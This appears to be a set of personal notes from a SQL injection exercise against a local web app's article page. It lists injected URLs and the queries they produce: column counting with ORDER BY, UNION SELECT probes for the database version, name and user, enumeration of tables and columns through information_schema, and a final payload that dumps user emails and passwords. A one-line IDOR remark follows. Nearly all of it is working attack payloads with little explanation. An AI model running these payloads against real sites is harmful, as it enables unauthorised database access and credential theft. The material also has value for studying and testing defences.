http://127.0.0.1:8000/article/2

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = 2 limit 1

http://127.0.0.1:8000/article/2

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = 2' limit 1

---------Ordey by Time-------------------------

http://127.0.0.1:8000/article/2%20order%20by%208#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = 2 order by 8# limit 1

---------Union select time-------------------------

--False statmen--
http://127.0.0.1:8000/article/-2%20union%20select%201,2,3,4,5,6,7,8#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = -2 union select 1,2,3,4,5,6,7,8# limit 1

------------Version,Databse,User-----------------------------


http://127.0.0.1:8000/article/-2%20union%20select%201,2,version(),4,5,6,7,8#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = -2 union select 1,2,version(),4,5,6,7,8# limit 1


http://127.0.0.1:8000/article/-2%20union%20select%201,2,database(),4,5,6,7,8#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = -2 union select 1,2,database(),4,5,6,7,8# limit 1


http://127.0.0.1:8000/article/-2%20union%20select%201,2,user(),4,5,6,7,8#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = -2 union select 1,2,user(),4,5,6,7,8# limit 1

------------------------------------control Table----------------------------------


http://127.0.0.1:8000/article/1%20and%20false%20union%20select%201,2,3,4,group_concat(table_name),6,7,8%20from%20information_schema.columns%20where%20table_schema=database()# 

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = 2 and false union select 1,2,3,GROUP_CONCAT(TABLE_NAME),5,6,7,8 from information_schema.columns where table_schema=database()# limit 1

----------------------control column---------------------------------------------------


http://127.0.0.1:8000/article/1%20and%20false%20union%20select%201,2,3,4,group_concat(column_name),6,7,8%20from%20information_schema.columns%20where%20table_name=0x7573657273#

select `articles`.*, `users`.`name` from `articles` inner join `users` on `articles`.`user_id` = `users`.`id` where articles.id = 2 and false union select 1,2,3,GROUP_CONCAT(COLUMN_NAME),5,6,7,8 from information_schema.columns where table_name=0x7573657273# limit 1



-------------------------------------Dumpin TIME!!-----------------------------------------


http://127.0.0.1:8000/article/1%20and%20false%20union%20select%201,2,3,4,group_concat(email,0x3a,password),6,7,8%20from%20users#


-----------------------------------------END------------------------------------------------------







IDOR ------------------------------------------


Inspect elemnt -> id(rand())